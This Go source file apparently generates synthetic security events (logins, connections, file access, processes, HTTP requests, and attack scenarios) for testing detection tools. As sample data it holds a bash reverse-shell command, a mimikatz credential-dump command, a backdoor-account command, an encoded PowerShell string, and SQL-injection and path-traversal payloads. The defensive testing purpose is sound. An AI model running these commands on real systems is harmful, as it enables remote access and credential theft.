package main

import (
	"fmt"
	"math/rand"
	"time"

	"github.com/google/uuid"
)

// EventGenerator generates realistic security events
type EventGenerator struct {
	rand *rand.Rand
}

// NewEventGenerator creates a new event generator
func NewEventGenerator() *EventGenerator {
	return &EventGenerator{
		rand: rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

// Event represents a generic security event
type Event struct {
	EventID    string                 `json:"event_id"`
	EventType  string                 `json:"event_type"`
	Timestamp  string                 `json:"timestamp"`
	SourceIP   string                 `json:"source_ip,omitempty"`
	SourceHost string                 `json:"source_host,omitempty"`
	Severity   string                 `json:"severity,omitempty"`
	Fields     map[string]interface{} `json:"fields"`
	RawData    string                 `json:"raw_data"`
}

// GenerateAuthEvent generates an authentication event
func (g *EventGenerator) GenerateAuthEvent(failed bool) Event {
	sourceIP := g.randomIP(false)
	username := g.randomUsername()
	result := "success"
	if failed {
		result = "failed"
	}

	fields := map[string]interface{}{
		"event_type":  "authentication",
		"source_ip":   sourceIP,
		"username":    username,
		"auth_result": result,
		"auth_method": g.randomStringChoice([]string{"password", "ssh_key", "mfa"}),
		"source_host": g.randomHostname(),
		"dest_host":   g.randomStringChoice([]string{"server-prod-01", "server-prod-02", "web-server-01"}),
	}

	return Event{
		EventID:   uuid.New().String(),
		EventType: "authentication",
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		SourceIP:  sourceIP,
		Fields:    fields,
		RawData:   fmt.Sprintf("Authentication %s for user %s from %s", result, username, sourceIP),
	}
}

// GenerateNetworkEvent generates a network connection event
func (g *EventGenerator) GenerateNetworkEvent(external bool) Event {
	sourceIP := g.randomIP(false)
	var destIP string
	if external {
		destIP = g.randomIP(true) // External IP
	} else {
		destIP = g.randomIP(false) // Internal IP
	}

	destPort := g.randomIntChoice([]int{22, 80, 443, 445, 3389, 8080, 3306, 5432})
	protocol := "tcp"
	state := g.randomStringChoice([]string{"established", "closed", "syn_sent"})

	fields := map[string]interface{}{
		"event_type":       "network_connection",
		"source_ip":        sourceIP,
		"dest_ip":          destIP,
		"source_port":      g.rand.Intn(60000) + 1024,
		"dest_port":        destPort,
		"protocol":         protocol,
		"bytes_sent":       g.rand.Intn(100000),
		"bytes_received":   g.rand.Intn(100000),
		"connection_state": state,
		"duration":         float64(g.rand.Intn(300)) + g.rand.Float64(),
	}

	return Event{
		EventID:   uuid.New().String(),
		EventType: "network_connection",
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		SourceIP:  sourceIP,
		Fields:    fields,
		RawData:   fmt.Sprintf("Network connection from %s to %s:%d (%s)", sourceIP, destIP, destPort, state),
	}
}

// GenerateFileEvent generates a file access event
func (g *EventGenerator) GenerateFileEvent(sensitive bool) Event {
	var filePath string
	if sensitive {
		filePath = g.randomStringChoice([]string{
			"/etc/passwd",
			"/etc/shadow",
			"/etc/sudoers",
			"C:\\Windows\\System32\\SAM",
			"C:\\Users\\Administrator\\Desktop\\passwords.txt",
		})
	} else {
		filePath = g.randomStringChoice([]string{
			"/var/log/syslog",
			"/home/user/documents/report.pdf",
			"C:\\Users\\user\\Documents\\file.docx",
			"/tmp/data.txt",
		})
	}

	action := g.randomStringChoice([]string{"read", "write", "delete", "execute"})
	user := g.randomUsername()

	fields := map[string]interface{}{
		"event_type": "file_access",
		"file_path":  filePath,
		"file_hash":  g.randomHash(),
		"action":     action,
		"user":       user,
		"process":    g.randomProcess(),
		"source_ip":  g.randomIP(false),
	}

	return Event{
		EventID:   uuid.New().String(),
		EventType: "file_access",
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Fields:    fields,
		RawData:   fmt.Sprintf("File %s: %s by user %s", action, filePath, user),
	}
}

// GenerateProcessEvent generates a process creation event
func (g *EventGenerator) GenerateProcessEvent(suspicious bool) Event {
	var processName, cmdLine string
	if suspicious {
		processName = g.randomStringChoice([]string{"powershell.exe", "cmd.exe", "bash", "nc.exe", "mimikatz.exe"})
		cmdLine = g.randomStringChoice([]string{
			"powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAA=",
			"cmd.exe /c net user hacker Password123! /add",
			"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			"mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
		})
	} else {
		processName = g.randomStringChoice([]string{"explorer.exe", "chrome.exe", "notepad.exe", "svchost.exe"})
		cmdLine = processName
	}

	fields := map[string]interface{}{
		"event_type":     "process_creation",
		"process_name":   processName,
		"process_id":     g.rand.Intn(65535),
		"parent_process": g.randomStringChoice([]string{"explorer.exe", "services.exe", "cmd.exe"}),
		"command_line":   cmdLine,
		"user":           g.randomStringChoice([]string{"SYSTEM", "Administrator", "root", "user"}),
		"source_host":    g.randomHostname(),
	}

	return Event{
		EventID:   uuid.New().String(),
		EventType: "process_creation",
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Fields:    fields,
		RawData:   fmt.Sprintf("Process created: %s - %s", processName, cmdLine),
	}
}

// GenerateHTTPEvent generates an HTTP request event
func (g *EventGenerator) GenerateHTTPEvent(suspicious bool) Event {
	sourceIP := g.randomIP(true)
	destIP := g.randomIP(false)
	method := g.randomStringChoice([]string{"GET", "POST", "PUT", "DELETE"})

	var uri string
	var statusCode int
	if suspicious {
		// Test payloads for suspicious activity detection - DO NOT execute in production
		uri = g.randomStringChoice([]string{
			"/admin/login' OR '1'='1",
			"/api/users?id=1 UNION SELECT * FROM passwords",
			"/../../../etc/passwd",
			"/admin/../../etc/shadow",
		})
		statusCode = g.randomIntChoice([]int{401, 403, 500})
	} else {
		uri = g.randomStringChoice([]string{
			"/",
			"/api/users",
			"/login",
			"/dashboard",
			"/static/css/style.css",
		})
		statusCode = g.randomIntChoice([]int{200, 201, 204, 304})
	}

	fields := map[string]interface{}{
		"event_type":    "http_request",
		"source_ip":     sourceIP,
		"dest_ip":       destIP,
		"method":        method,
		"uri":           uri,
		"status_code":   statusCode,
		"user_agent":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"bytes":         g.rand.Intn(10000),
		"response_time": float64(g.rand.Intn(1000)) / 1000.0,
	}

	return Event{
		EventID:   uuid.New().String(),
		EventType: "http_request",
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		SourceIP:  sourceIP,
		Fields:    fields,
		RawData:   fmt.Sprintf("%s %s %s - %d", sourceIP, method, uri, statusCode),
	}
}

// Helper functions for generating realistic data

func (g *EventGenerator) randomIP(external bool) string {
	if external {
		// Use TEST-NET ranges or realistic external IPs
		return g.randomStringChoice([]string{
			fmt.Sprintf("192.0.2.%d", g.rand.Intn(255)),
			fmt.Sprintf("198.51.100.%d", g.rand.Intn(255)),
			fmt.Sprintf("203.0.113.%d", g.rand.Intn(255)),
			"8.8.8.8",
			"1.1.1.1",
		})
	}
	// Internal IP ranges
	return fmt.Sprintf("10.0.%d.%d", g.rand.Intn(255), g.rand.Intn(255))
}

func (g *EventGenerator) randomUsername() string {
	usernames := []string{
		"admin", "root", "administrator", "user", "jdoe", "jsmith",
		"alice", "bob", "charlie", "dave", "svc_backup", "svc_sql",
	}
	return usernames[g.rand.Intn(len(usernames))]
}

func (g *EventGenerator) randomHostname() string {
	return fmt.Sprintf("workstation-%02d", g.rand.Intn(100))
}

func (g *EventGenerator) randomProcess() string {
	processes := []string{
		"/usr/bin/cat", "/usr/bin/vim", "/bin/bash", "/usr/bin/less",
		"C:\\Windows\\System32\\cmd.exe", "C:\\Program Files\\app.exe",
	}
	return processes[g.rand.Intn(len(processes))]
}

func (g *EventGenerator) randomHash() string {
	// Generate a fake MD5 hash
	return fmt.Sprintf("%032x", g.rand.Uint64())
}

func (g *EventGenerator) randomStringChoice(choices []string) string {
	return choices[g.rand.Intn(len(choices))]
}

func (g *EventGenerator) randomIntChoice(choices []int) int {
	return choices[g.rand.Intn(len(choices))]
}

// Scenario generators

// GenerateBruteForceScenario generates a brute force attack scenario
func (g *EventGenerator) GenerateBruteForceScenario(targetIP string, count int) []Event {
	events := make([]Event, count+1)

	// Multiple failed attempts
	for i := 0; i < count; i++ {
		event := g.GenerateAuthEvent(true)
		// Override source IP to simulate attack from single source
		event.SourceIP = targetIP
		event.Fields["source_ip"] = targetIP
		events[i] = event
	}

	// Final successful login
	successEvent := g.GenerateAuthEvent(false)
	successEvent.SourceIP = targetIP
	successEvent.Fields["source_ip"] = targetIP
	events[count] = successEvent

	return events
}

// GeneratePortScanScenario generates a port scan scenario
func (g *EventGenerator) GeneratePortScanScenario(sourceIP string, targetIP string, portCount int) []Event {
	events := make([]Event, portCount)
	commonPorts := []int{21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443}

	for i := 0; i < portCount; i++ {
		event := g.GenerateNetworkEvent(false)
		event.SourceIP = sourceIP
		event.Fields["source_ip"] = sourceIP
		event.Fields["dest_ip"] = targetIP
		event.Fields["dest_port"] = commonPorts[i%len(commonPorts)]
		event.Fields["connection_state"] = "syn_sent"
		events[i] = event
	}

	return events
}

// GenerateDataExfiltrationScenario generates a data exfiltration scenario
func (g *EventGenerator) GenerateDataExfiltrationScenario(sourceIP, externalIP string) []Event {
	events := make([]Event, 10)

	for i := 0; i < 10; i++ {
		event := g.GenerateNetworkEvent(true)
		event.SourceIP = sourceIP
		event.Fields["source_ip"] = sourceIP
		event.Fields["dest_ip"] = externalIP
		event.Fields["dest_port"] = 443
		event.Fields["bytes_sent"] = 104857600 // 100MB
		event.Fields["connection_state"] = "established"
		events[i] = event
	}

	return events
}
